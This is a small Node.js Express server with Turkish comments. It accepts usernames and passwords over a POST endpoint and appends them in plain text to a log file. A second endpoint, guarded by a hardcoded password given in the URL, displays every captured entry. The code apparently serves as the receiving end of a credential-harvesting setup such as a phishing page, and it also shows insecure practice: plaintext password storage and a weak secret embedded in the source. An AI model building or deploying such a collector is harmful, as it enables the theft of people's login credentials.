const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post("/log", (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toLocaleString();
  const logEntry = `[${timestamp}] Username: ${username}, Password: ${password}\n`;
  fs.appendFileSync("log.txt", logEntry);
  res.sendStatus(200);
});

// Log dosyasını görüntülemek için güvenli endpoint
app.get("/viewlogs/:password", (req, res) => {
  const secretPassword = "159753"; // Bu şifreyi güvenli bir şifre ile değiştirin
  
  if (req.params.password === secretPassword) {
    try {
      const logData = fs.readFileSync("log.txt", "utf8");
      res.send(`<pre>${logData}</pre>`);
    } catch (error) {
      res.status(500).send("Log dosyası okunamadı: " + error.message);
    }
  } else {
    res.status(401).send("Yetkisiz erişim!");
  }
});

app.listen(PORT, () => console.log(`Log server running on ${PORT}`));
